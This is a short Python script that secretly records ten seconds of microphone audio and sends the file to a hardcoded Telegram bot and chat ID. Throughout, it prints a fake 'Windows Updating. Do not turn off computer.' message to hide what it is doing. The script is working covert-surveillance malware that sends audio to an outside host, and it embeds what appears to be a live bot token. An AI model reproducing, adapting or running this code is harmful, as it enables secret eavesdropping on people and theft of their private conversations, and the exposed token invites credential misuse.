import sys
# Add the directory where 'requests' is located
sys.path.insert(0, r'C:\\Python\\Lib\\site-packages')

import sounddevice as sd
from scipy.io.wavfile import write
import telegram
import asyncio

# Set your Telegram bot token and chat ID
BOT_TOKEN = '7866483331:AAFLe0iNc5VrdZkrByBrDGfr4asHeZi2O9Q'
CHAT_ID = '2044432474'

# Set parameters
duration = 10  # seconds
sample_rate = 44100  # samples per second

# Record audio
print("Windows Updating. Do not turn off computer.")
audio_data = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
sd.wait()  # Wait for the recording to finish
print("Windows Updating. Do not turn off computer.")

# Save to a WAV file
audio_file = "output.wav"
write(audio_file, sample_rate, audio_data)
print("Windows Updating. Do not turn off computer.")

# Define an asynchronous function to send the audio to Telegram
async def send_audio_to_telegram(token, chat_id, audio_file):
    bot = telegram.Bot(token=token)
    with open(audio_file, 'rb') as audio:
        await bot.send_audio(chat_id=chat_id, audio=audio)
    print("Windows Updating. Do not turn off computer.")

# Run the asynchronous function
asyncio.run(send_audio_to_telegram(BOT_TOKEN, CHAT_ID, audio_file))
